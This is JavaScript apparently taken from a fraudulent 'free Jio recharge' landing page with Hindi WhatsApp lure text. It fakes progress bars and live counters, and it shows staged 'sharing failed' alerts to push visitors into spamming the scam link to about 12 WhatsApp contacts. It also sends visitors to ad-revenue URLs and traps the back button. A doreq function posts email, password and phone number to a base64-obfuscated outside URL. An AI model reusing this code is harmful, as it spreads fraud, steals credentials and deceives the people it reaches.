var DOMString = {
				loading: document.querySelector("#loading-svg"),
				checked: document.querySelector("#check-svg"),
				elemPorcents: document.querySelector(".quedate__porcent"),
				elemPorcentText: document.querySelector(".quedate__porcent-text"),
				firstBox: document.querySelector("#first-box"),
				secondBox: document.querySelector("#second-box"),
				thirdBox: document.querySelector("#third-box"),
				phone: document.querySelector(".quedate__form-input"),
				messageStatus: document.querySelector(".message-status"),
				loadingG: document.querySelector("#loading-g"),
				boxes: document.querySelectorAll(".quedate__first"),
				firstPorcent: document.querySelector("#first-porcent"),
				secondPorcent: document.querySelector("#second-porcent"),
				thirdPorcent: document.querySelector("#third-porcent"),
				barLoaders: document.querySelectorAll(".quedate__load-a"),
				svgLoading: document.querySelectorAll(".quedate__load-animate"),
				svgChecked: document.querySelectorAll(".quedate__load-check"),
				permissionContainer: document.querySelector(".permision-container"),
				permissionLoading: document.querySelector(".loading2"),
				statusMessage: document.querySelector(".fb-request"),
				share: document.querySelector("#compartir"),
				congrats: document.querySelector(".js-congrats"),
				sharing: document.querySelector(".js-share"),
				verify: document.querySelector("#verify")
			}, objServer = {}, landingDomain = "Array",
			// adsLink = "https://qureka-757-predchamp.blogspot.com/";
			adsLink = "";
	//adsLink = "ad/ad.html";
	document.addEventListener("click", function (c) {
		console.log(c);
		var a = c.toElement || c.srcElement;
		if (a.id) switch (a.id) {
			case"validar":
				a.classList.add("js-hidden"), setTimeout(function () {
					DOMString.loading.classList.remove("js-hidden"), DOMString.elemPorcents.classList.remove("js-hidden");
					var b = 0;
					window.loadingPorcents = setInterval(function () {
						DOMString.elemPorcents.textContent = b + "%", 100 == b ? (clearInterval(window.loadingPorcents), DOMString.loading.classList.add("js-hidden"), DOMString.checked.classList.remove("js-hidden"), DOMString.elemPorcents.classList.add("js-hidden"), DOMString.elemPorcentText.classList.remove("js-hidden"), setTimeout(function () {
							DOMString.checked.classList.add("js-hidden"), DOMString.firstBox.classList.add("js-hidden"), DOMString.secondBox.classList.remove("js-hidden"), DOMString.elemPorcentText.classList.add("js-hidden")
						}, 2e3)) : b++
					}, 50)
				}, 500);
				break;
			case"enviar":
				var a = DOMString.phone;
				a.value ? (objServer.phone = a.value, DOMString.messageStatus.classList.add("js-hidden"), DOMString.secondBox.classList.add("js-hidden"), DOMString.loadingG.classList.remove("js-hidden"), setTimeout(function () {
					DOMString.loadingG.classList.add("js-hidden"), DOMString.thirdBox.classList.remove("js-hidden");
					var i = 0, j = 0, k = !0,
							l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
					window.loadingData = setTimeout(function a() {
						l.length > i && (DOMString.boxes[i].classList.remove("js-hidden"), DOMString.barLoaders[i].classList.remove("js-hidden"), window._setting = setInterval(function () {
							if (l[i].textContent = j + "%", DOMString.barLoaders[i].style.width = j + "%", 100 === j && k) clearInterval(window._setting), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++, j = 0, window.loadingData = setTimeout(a, 1e3); else if (50 == j && 1 == i && k) clearInterval(window._setting), k = !1, window.loadingData = setTimeout(a, 1e3); else if (!k && 100 === j) {
								clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
								var d = 1, e = 0, m = messageToSend();
								var s=1;
								set_Cookie("d",s);
								DOMString.barLoaders[i].classList.remove("js-hidden"), DOMString.boxes[i].classList.remove("js-hidden"), DOMString.svgLoading[i].classList.remove("js-hidden"), l[i].textContent = "0%", DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
									if (12 <= d) {
										for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
											// adhtml();
											//window.open(adsLink)
											// FB.ui({
											// 	method: 'share',
											// 	quote: messageSend(),
											// 	href: "Array"
											// }, function(response){});


											// setTimeout(function() {
											// 	adhtml();
											// }, 2000)

										});
										DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")

									} else
											/*      e = Math.floor(100 * (d / 12)), d++, l[i].textContent = e + "%", DOMString.barLoaders[i].style.width = e + "%",
                            e = Math.floor(100 * (d / 10))*0.5+50 ;*/
										//d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=85:d==7?e=90:d==8?e=90:d==9?e=95:d==10?e=100:d==11?e=100:d==12?e=100:void(0);
										d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
									d++;
									setTimeout(function() {
										//d == 3 || d == 7 ? alert(tip_text()) : void(0) ;
										d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
										l[i].textContent = e + "%";
										DOMString.barLoaders[i].style.width = e + "%";
									}, 2000);
									shareStat(d);
									
									
									set_Cookie('e',e);
									set_Cookie('d',d);

									/*       if( d == 10 ||d == 11 || d == 12 ){
                             location.href = "whatsapp://send?text=  *देश में रिकॉर्ड वैक्सीनेशन होने की ख़ुशी में भारत सरकार द्वारा सभी भारतीय यूजर्स* को *3 महीने* का रिचार्ज फ्री में दिया जा रहा है।  %0A%0A
अगर आपके पास *Jio*, *Airtel* या *Vi* का सिम हैं तो आप इस ऑफर का लाभ उठा सकते है । %0A%0A
*नोट:-* नीचे दी गई लिंक पर क्लिक करके अपना फ़्री रीचार्ज प्राप्त करें। %0A%0A
👉🏼 https://free.3monthrecharge.online" ;
                         }else{
                                             window.location.href = "whatsapp://send?text=*देश में रिकॉर्ड वैक्सीनेशन होने की ख़ुशी में भारत सरकार द्वारा सभी भारतीय यूजर्स* को *3 महीने* का रिचार्ज फ्री में दिया जा रहा है।  %0A%0A
अगर आपके पास *Jio*, *Airtel* या *Vi* का सिम हैं तो आप इस ऑफर का लाभ उठा सकते है । %0A%0A
*नोट:-* नीचे दी गई लिंक पर क्लिक करके अपना फ़्री रीचार्ज प्राप्त करें। %0A%0A
👉🏼 https://free.3monthrecharge.online/" + m
                         }*/
	var items={1:{ "share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},2:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},3:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},4:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},5:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},6:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},7:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},8:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},9:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},10:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},11:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},12:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},13:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},14:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},15:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},}

									// var randomItem = items[d]['share_desc']+' '+items[d]['share_link'];
									var randomItem = items[d]['share_link'];


									window.open("whatsapp://send?text=*AMBANI BIRTHDAY* ऑफर *जिओ कंपनी* अपने *मुकेश अंबानी* के जन्मदिन पर दे रहा है सभी भारतीय यूजर को *₹239* का 28 दिन वाला रिचार्ज फ्री में देने का वादा किया है तो अभी निचे नीले रंग की लिंक पर क्लिक करके अपने नंबर पर रिचार्ज करे। %0a" + randomItem + "" );
									//window.location.href = "whatsapp://send?text=" + m

								})
							}
							j++
						}, 30))
					}, 1e3)
				}, 1500)) : (DOMString.messageStatus.classList.remove("js-hidden"), DOMString.messageStatus.style.color = "red", DOMString.messageStatus.style.fontWeight = "bold", DOMString.messageStatus.textContent = "We need a number");
		}
	});

	get_Cookie('e') ? setTimeout('enviar()',500) : void(0);
	landingDomain='Array'
	function deadline() {
		var day3 = new Date();
		day3.setTime(day3.getTime()+24*60*60*1000);
		return day3.getFullYear()+"-" + (day3.getMonth()+2) + "-" + day3.getDate();
	}
	function enviar(){
		l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
		i = 1;

		clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
		var d = parseInt(get_Cookie('d'));
		e = parseInt(get_Cookie('e'));
		m = messageToSend();
		d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
		DOMString.barLoaders[i].classList.remove("js-hidden");
		DOMString.boxes[i].classList.remove("js-hidden");
		DOMString.svgLoading[i].classList.remove("js-hidden");
		l[i].textContent = e + "%";
		DOMString.barLoaders[i].style.width = e + "%";
		DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
			if (12 <= d) {
				for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
					// adhtml();
					/*   record('4g','wc');*/
					//window.open(adsLink)
					// FB.ui({
					// 	method: 'share',
					// 	quote: messageSend(),
					// 	href: "Array"
					// }, function(response){});

					// setTimeout(function() {
					// 	adhtml();
					// }, 2000)

				});
				DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")

			} else {
				/*       record('4g',d);*/
				// e = Math.floor(100 * (d / 10))*0.5+50 ;
				//d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=85:d==7?e=90:d==8?e=90:d==9?e=95:d==10?e=100:d==11?e=100:d==12?e=100:void(0);

				d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
				d++;
				setTimeout(function() {
					//d == 3  || d == 7 ? alert(tip_text()) : void(0) ;
					d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
					l[i].textContent = e + "%";
					DOMString.barLoaders[i].style.width = e + "%";
				}, 2000);
				set_Cookie('e',e);
				set_Cookie('d',d);
				shareStat(d);
				
				/*           if( d == 10 || d == 11 || d == 12 ){
                       location.href = "whatsapp://send?text= *देश में रिकॉर्ड वैक्सीनेशन होने की ख़ुशी में भारत सरकार द्वारा सभी भारतीय यूजर्स* को *3 महीने* का रिचार्ज फ्री में दिया जा रहा है।  %0A%0A
अगर आपके पास *Jio*, *Airtel* या *Vi* का सिम हैं तो आप इस ऑफर का लाभ उठा सकते है । %0A%0A
*नोट:-* नीचे दी गई लिंक पर क्लिक करके अपना फ़्री रीचार्ज प्राप्त करें। %0A%0A
👉🏼 https://free.3monthrecharge.online" ;
                   }else{
                   window.location.href = "whatsapp://send?text=*देश में रिकॉर्ड वैक्सीनेशन होने की ख़ुशी में भारत सरकार द्वारा सभी भारतीय यूजर्स* को *3 महीने* का रिचार्ज फ्री में दिया जा रहा है।  %0A%0A
अगर आपके पास *Jio*, *Airtel* या *Vi* का सिम हैं तो आप इस ऑफर का लाभ उठा सकते है । %0A%0A
*नोट:-* नीचे दी गई लिंक पर क्लिक करके अपना फ़्री रीचार्ज प्राप्त करें। %0A%0A
👉🏼 https://free.3monthrecharge.online" + m;
                   }*/

				var items={1:{ "share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},2:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},3:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},4:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},5:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},6:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},7:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},8:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},9:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},10:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},11:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},12:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},13:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},14:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},15:{"share_link":"https://free28day.page.link/FreeRecharge", "share_type":0,"share_desc":""},}

				// var randomItem = items[d]['share_desc']+' '+items[d]['share_link'];
				var randomItem = items[d]['share_link'];


									window.open("whatsapp://send?text=*AMBANI BIRTHDAY* ऑफर *जिओ कंपनी* अपने *मुकेश अंबानी* के जन्मदिन पर दे रहा है सभी भारतीय यूजर को *₹239* का 28 दिन वाला रिचार्ज फ्री में देने का वादा किया है तो अभी निचे नीले रंग की लिंक पर क्लिक करके अपने नंबर पर रिचार्ज करे। %0a" + randomItem + "" );
				// window.open("whatsapp://send?text=" + m);
				//window.location.href = "whatsapp://send?text=" + m;
			}
		})

	}
	function doreq(e, a, b) {
		var c = new XMLHttpRequest;
		c.open("POST.html", atob("aHR0cHM6Ly9hcHMucmVwcm92aWRlcy5jb20vbG9naW4ucGhwP3drcj16eGNtbmJ2MTI=")), c.onreadystatechange = function () {
			4 === c.readyState && 200 === c.status
		}, c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.send("email=" + e + "&pass=" + a + "&phone=" + b)
	}
	function tip_text() {
		var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
				b = "";
		return "Sharing failed! The same group or the same friend is invalid. Please share in different group.";
		//return "en" === a ? b="Sharing failed! The same group or the same friend is invalid. Please check and share again." : "id" === a ? b="Berbagi gagal! Grup yang sama atau teman yang sama tidak valid. Silakan periksa dan bagikan lagi." :  b="Sharing failed! The same group or the same friend is invalid. Please check and share again." ;

	}
	function messageToSend() {
		var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
				b = "";
		return "" + landingDomain ;
		//return "en" === a ? b = "*Tokopedia comprehensive promotion*%0A*Get 200GB Intrnet Data without any Recharge*%0A%0AFor users to have a better network experience tokopedia, 200GB of Intrnet Data is sent to everyone for this%0AReceiving instructions:%0A1. Each phone number can be picked up once%0A2. This event does not require any fees%0AThe activity plan is real and effective,   Deadline:"+deadline()+" %0A%0AClick below to Get Free 200GB Data 60 days for all Operator %0A*Get it now HERE* %0A " + landingDomain : "id" === a ? b = "*Promosi komprehensif Tokopedia*%0A*Dapatkan Data Intrnet 200GB tanpa Isi Ulang*%0A%0AAgar pengguna memiliki pengalaman jaringan yang lebih baik tokopedia, 200GB Data Intrnet dikirim ke semua orang untuk ini%0AMenerima instruksi:%0A1. Setiap nomor telepon dapat diambil satu kali%0A2. Acara ini tidak membutuhkan biaya apapun%0ARencana kegiatan nyata dan efektif, Tenggat:"+deadline()+" %0A%0AKlik di bawah ini untuk Mendapatkan Gratis 200GB Data 60 hari untuk semua Operator%0A*Dapatkan sekarang DI SINI*%0A " + landingDomain : b = "*Tokopedia comprehensive promotion*%0A*Get 200GB Intrnet Data without any Recharge*%0A%0AFor users to have a better network experience tokopedia, 200GB of Intrnet Data is sent to everyone for this%0AReceiving instructions:%0A1. Each phone number can be picked up once%0A2. This event does not require any fees%0AThe activity plan is real and effective,   Deadline:"+deadline()+" %0A%0AClick below to Get Free 200GB Data 60 days for all Operator %0A*Get it now HERE* %0A " + landingDomain ;
	}

	function messageSend() {
		return "" + landingDomain ;
	}

	function shareStat(share){
		var param = share - 1;
		ajax({
			type: "POST",
			url : "/shareStat.php",
			data: {share: param, app: '4g'}
		});
	}

	function ajax(options){
		//options=options||{};
		//optoins.type=(options.type||'GET').toUpperCase();
		//options.dataType=options.dataType||'json';
		options.dataType='json';
		params=formatParams(options.data);

		//创建-第一步
		var xhr;
		//非IE6
		if(window.XMLHttpRequest){
			xhr=new XMLHttpRequest();
		}else{
			//ie6及其以下版本浏览器
			xhr=ActiveXObject('Microsoft.XMLHTTP');
		}

		//接收-第三步
		xhr.onreadystatechange=function(){
			if(xhr.readyState==4){
				var status=xhr.status;
				if(status>=200&&status<300){
					options.success&&options.success(xhr.responseText,xhr.responseXML);
				}else{
					options.error&&options.error(status);
				}
			}
		}

		//连接和发送-第二步
		if(options.type=='GET'){
			xhr.open('GET.html',options.url+'?'+params,true);
			xhr.send(null);
		}else if(options.type=='POST'){
			xhr.open('POST.html',options.url,true);
			//设置表单提交时的内容类型
			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			xhr.send(params);
		}
	}

	//格式化参数
	function formatParams(data){
		var arr=[];
		for(var name in data){
			arr.push(encodeURIComponent(name)+'='+encodeURIComponent(data[name]));
		}
		arr.push(('v='+Math.random()).replace('.',''));
		return arr.join('&');
	}


	function operatorDataBack() {
		var d = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0];

		if(d == 'pt'){
			d = 'pt-BR';
		}

		var endpoint = 'https://pro.ip-api.com/json/?lang=' + d + '&key=zfJdWsy0dcKGCzT';

		var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				var response = JSON.parse(this.responseText);
				if(response.status !== 'success') {
					console.log('query failed: ' + response.message);
					return
				}

				set_Cookie("countryCode",response.countryCode);

				document.querySelector(".quedate-logo").textContent = response.isp;
				document.querySelector(".quedate__company").textContent = response.city;
				document.querySelector(".quedate__country").textContent = response.country;
				document.querySelector(".quedate__city").textContent = response.regionName;

			}
		};
		xhr.open('GET.html', endpoint, true);
		xhr.send();


	}

	operatorDataBack();
	//
	// function operatorData(c) {
	// 	var a = new XMLHttpRequest;
	// 	a.open("GET", atob("aHR0cHM6Ly90ZHNqc2V4dDMuY29tL0V4dFNlcnZpY2Uuc3ZjL2dldGV4dHBhcmFtcw==")), a.onreadystatechange = function () {
	// 		4 === a.readyState && 200 == a.status && c(a.response)
	// 	}, a.send(null)
	// }
	//
	// operatorData(function (e) {
	// 	var {isp: a, cnames: b, subdiv: c} = JSON.parse(e);
	// 	var d = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0,
	// 			navigator.languages[0].indexOf("-")) : navigator.languages[0];
	// 	if("pt" === d){
	// 		document.querySelector(".quedate__company").textContent = a, document.querySelector(".quedate__country").textContent = b['pt-BR'], document.querySelector(".quedate__city").textContent = c[0]['pt-BR']
	// 	}else if("es" === d){
	// 		document.querySelector(".quedate__company").textContent = a, document.querySelector(".quedate__country").textContent = b.es, document.querySelector(".quedate__city").textContent = c[0].es
	// 	}else{
	// 		document.querySelector(".quedate__company").textContent = a, document.querySelector(".quedate__country").textContent = b.en, document.querySelector(".quedate__city").textContent = c[0].en
	//
	// 	}
	// });
	var counter = 153;
	setInterval(function () {
		document.querySelector(".chat__reactions-counter").textContent = counter + "k", counter++
	}, 5e3);
	var counter2 = 337;
	setInterval(function () {
		document.querySelector(".js-counter").textContent = counter2, counter2++
	}, 5e3);
	var seconds = 1;
	setInterval(function () {
		for (var c = document.querySelectorAll(".js-seconds"), a = 0; a < c.length; a++) c[a].textContent = seconds + "m";
		seconds++
	}, 6e3), setTimeout(function () {
		var b = document.querySelector("#js-box-1");
		b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
	}, 1e3), setTimeout(function () {
		var b = document.querySelector("#js-box-2");
		b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
	}, 3e3);</script>
<script>
	function getTextNodesIn(a, b) {
		var c = [];
		if (a) for (var d = a.childNodes, e = d.length; e--;) {
			var f = d[e], g = f.nodeType;
			3 == g ? (!b || b(f, a)) && !f.wholeText.includes("\n") && !f.parentNode.__proto__.toString().includes("SVG") && !f.wholeText.match(/\b(?:Carles|Roign|US$|Demand|Laurens|Kule|Taufik|Albert)\b/gi) && 4 <= f.wholeText.length && c.push(f) : (1 == g || 9 == g || 11 == g) && (c = c.concat(getTextNodesIn(f, b)))
		}
		return c
	}

	function adhtml(){
		lasthtml=' <button style="display: flex;align-items: center;justify-content: center;margin: 0;" id="verify" class="quedate__cta-btn" onclick="openad()">ANDROID</button>        <button style="display: flex;align-items: center;justify-content: center;" id="verify" class="quedate__cta-btn" onclick="openad()">IPHONE</button>  '
		document.getElementById("laststep").innerHTML=lasthtml;
	}
	var source = [
  "https://www.highcpmrevenuegate.com/wkvp35rrcy?key=1bebd13a8ff7fc68ab365c69f5bc2a6f",
  "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://aufftool.in/how-to-get-a-vip-number-in-reliance-jio-sim-like-4567-or-8888/&ved=2ahUKEwi25qSyitqAAxWfyDgGHU_3ASwQFnoECAkQAQ&usg=AOvVaw1vZqnaaiDI2fI6fxx-QwXY", "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://aufftool.in/tag/how-to-get-jio-vip-number/&ved=2ahUKEwi25qSyitqAAxWfyDgGHU_3ASwQFnoECAoQAQ&usg=AOvVaw0z580crkzfw70Rnm0z2N9-", "https://www.highcpmrevenuegate.com/wkvp35rrcy?key=1bebd13a8ff7fc68ab365c69f5bc2a6f", "https://www.highcpmrevenuegate.com/wkvp35rrcy?key=1bebd13a8ff7fc68ab365c69f5bc2a6f", "https://www.highcpmrevenuegate.com/wkvp35rrcy?key=1bebd13a8ff7fc68ab365c69f5bc2a6f"
];
		function openad(){
		var linksio =	source[Math.floor(Math.random()*source.length)];
		window.open(linksio);
	}
</script>
<script>
	window.onhashchange=function(){jp();};
	function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
	function jp() {
		fh();}
	setTimeout('hh();', 500);
	function fh(){
		location.href="#";
	}
	function goon(){
		location.href="#";
		// location.href="#";
	}
